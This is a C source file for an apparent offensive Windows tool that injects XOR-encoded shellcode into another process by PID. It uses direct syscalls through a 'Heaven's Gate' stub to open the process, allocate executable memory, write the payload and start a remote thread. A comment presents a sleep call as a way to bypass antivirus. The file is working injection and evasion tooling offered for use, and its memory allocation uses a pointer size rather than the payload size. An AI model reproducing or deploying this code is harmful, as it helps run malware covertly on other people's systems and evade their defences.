//tool made by b4shcr00k

#include <stdio.h>
#include <Windows.h>
#include "structs.h"
#pragma comment(lib, "ntdll.lib")

#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#define okay(msg , ...) printf("[+] "msg"\n",##__VA_ARGS__)
#define error(msg , ...) printf("[-] "msg"\n",##__VA_ARGS__)
#define warn(msg , ...) printf("[!] "msg"\n",##__VA_ARGS__)
#define input(msg , ...) printf("[->] "msg" > ",##__VA_ARGS__)

EXTERN_C VOID HeavensDecent(__int64 syscallId);
EXTERN_C NTSTATUS HeavensGate();
//encryption key you can change this if you want 
#define key 0xAA;

//ntdll functions declaration 
typedef NTSTATUS(NTAPI* NtWriteVirtualMemory_t)(
	HANDLE ProcessHandle,
	PVOID BaseAddress,
	PVOID Buffer,
	ULONG NumberOfBytesToWrite,
	PULONG NumberOfBytesWritten
	);
typedef NTSTATUS(NTAPI* NtOpenProcessfn)(
	PHANDLE ProcessHandle,
	ACCESS_MASK DesiredAccess,
	POBJECT_ATTRIBUTES ObjectAttributes,
	PCLIENT_ID ClientId
	);
typedef NTSTATUS(NTAPI* NtAllocateVirtualMemory_t)(
	HANDLE    ProcessHandle,
	PVOID* BaseAddress,
	ULONG_PTR ZeroBits,
	PSIZE_T   RegionSize,
	ULONG     AllocationType,
	ULONG     Protect
	);
typedef NTSTATUS(NTAPI* NtCreateThreadEx_t)(
	PHANDLE ThreadHandle,
	ACCESS_MASK DesiredAccess,
	POBJECT_ATTRIBUTES ObjectAttributes,
	HANDLE ProcessHandle,
	PVOID StartRoutine,
	PVOID Argument,
	ULONG CreateFlags,
	SIZE_T ZeroBits,
	SIZE_T StackSize,
	SIZE_T MaximumStackSize,
	PVOID AttributeList
	);


//reads and enrypts the shellcode in memory
ret ReadShellCode(char *path)
{
	FILE* fp = fopen(path, "rb");
	ret infos;
	if (!fp)
	{
		error("Failed To Open File");
	}
	fseek(fp, 0, SEEK_END);
	long filesize = ftell(fp);
	fseek(fp, 0, SEEK_SET);

	if (filesize == 0)
	{
		error("File is empty");
	}
	unsigned char* buf = (unsigned char*)malloc(filesize * sizeof(BYTE));
	if (buf == 0)
	{
		error("Failed To Allocate Space For the shellcode");
	}
	else
	{
		if (!fread(buf, 1, filesize, fp))
		{
			error("Failed To Read Shellcode Into Memory");

		}
		else
		{
			for (size_t i = 0; i < filesize; i++)
			{
				buf[i] = buf[i] ^ key;
			}
			okay("Shellcode Encrypted And Stored In memory");
		}
	}
	fclose(fp);
	infos.buf = buf;
	infos.filesize = filesize;
	return infos;
}

//gets the syscall id everytime we call an nt function we call this
__int64 GetSysCallId(char *funcname)
{
	HANDLE hProcess = GetCurrentProcess();
	HANDLE hModule = GetModuleHandleA("ntdll.dll");
	if (!hModule)
	{
		error("Failed To Get Handle To NtDll Error %d",GetLastError());
	}
	else
	{
		okay("Got Handle To NtDll");
	}
	FARPROC FuncAddr = GetProcAddress(hModule , funcname);
	__int64 syscallByte = 0;
	if (!ReadProcessMemory(hProcess, (LPCVOID)((PBYTE)FuncAddr + 4),&syscallByte,1,NULL))
	{
		error("Failed To Read SysCallId ERROR : (%d) ", GetLastError());
	}
	else
	{
		okay("SysCall For %s : %d", funcname, syscallByte);
		return syscallByte;
	}
}

//gets a handle to the process 
HANDLE __NtOpenProcess(DWORD PID)
{
	HANDLE hProcess = NULL;
	CLIENT_ID clientId = { 0 };
	OBJECT_ATTRIBUTES objAttr;

	clientId.UniqueProcess = (HANDLE)PID;
	clientId.UniqueThread = 0;

	InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);
	__int64 syscall = GetSysCallId("NtOpenProcess");
	HeavensDecent(syscall);
	NtOpenProcessfn fn = (NtOpenProcessfn)HeavensGate;
	NTSTATUS status = fn(&hProcess , PROCESS_ALL_ACCESS,&objAttr,&clientId);
	if (NT_SUCCESS(status))
	{
		okay("Got Handle To Process 0x%p", hProcess);
	}
	else
	{
		error("Failed To Get Handle To Process");
	}
	return hProcess;
	
}
//allocates space in the target process
LPVOID _NtVirtualAlloc(HANDLE hProcess, SIZE_T size)
{
	PVOID baseAddress = NULL;

	SIZE_T regionSize = size;
	__int64 syscallid = GetSysCallId("NtAllocateVirtualMemory");
	HeavensDecent(syscallid);
	NtAllocateVirtualMemory_t fn = (NtAllocateVirtualMemory_t)HeavensGate;
	NTSTATUS status = fn(hProcess, &baseAddress, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (NT_SUCCESS(status))
	{
		okay("Allocated In the Target Process at 0x%p",baseAddress);
	}
	else
	{
		error("Failed To Allocate Space For The Payload %d ",GetLastError());
	}
	return baseAddress;
}
//first decrypts the shellcode then injects it in the target process
void _NtWriteProcessMem(HANDLE hProcess, LPVOID BaseAddr, ret infos)
{
	ULONG bytesWritten = 0;
	__int64 syscallid = GetSysCallId("NtWriteVirtualMemory");
	HeavensDecent(syscallid);
	NtWriteVirtualMemory_t fn = (NtWriteVirtualMemory_t)HeavensGate;
	for (int i = 0; i < infos.filesize; i++)
	{
		infos.buf[i] = infos.buf[i] ^ key;
	}
	okay("Shellcode Decrypted");
	NTSTATUS status = fn(hProcess, BaseAddr, infos.buf, (ULONG)infos.filesize, NULL);
	if (NT_SUCCESS(status))
	{
		okay("Payload Written Into Target Process ",);
	}
	else
	{
		error("Failed To Write Payload Into Target Process");
	}
}

//starts a thread to execute the shellcode
HANDLE _NtCreateRemoteThread(HANDLE hProcess, LPVOID lpStartAddress)
{
	__int64 syscallid = GetSysCallId("NtCreateThreadEx");
	HeavensDecent(syscallid);
	NtCreateThreadEx_t fn = (NtCreateThreadEx_t)HeavensGate;
	HANDLE hThread = NULL;
	NTSTATUS status = fn(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, lpStartAddress, NULL, FALSE, 0, 0, 0, NULL);
	if (NT_SUCCESS(status))
	{
		okay("Thread Created At 0x%p", hThread);
	}
	else
	{
		error("Failed To Create Thread 0x%p", hThread);
	}
	return hThread;
}


int main(int argc, char *argv[])
{
	if (argc != 3 )
	{
		error("Usage HeavensGate.exe [SHELLCODE PATH] [TARGET PROCESS PID]");
		return -1;
	}
	else
	{
		char* path = argv[1];
		DWORD PID = (DWORD)atoi(argv[2]);
		ret infos = ReadShellCode(path);
		HANDLE hProcess = NULL;

		hProcess = __NtOpenProcess(PID);
		LPVOID remoteBase = _NtVirtualAlloc(hProcess, sizeof(infos.buf));
		Sleep(5000); //might help bypass some avs 
		_NtWriteProcessMem(hProcess, remoteBase, infos);

		LPTHREAD_START_ROUTINE lpStartRoutine = (LPTHREAD_START_ROUTINE)remoteBase;

		HANDLE hThread = _NtCreateRemoteThread(hProcess, lpStartRoutine);

		CloseHandle(hThread);
		CloseHandle(hProcess);
		return 0;
	}
}
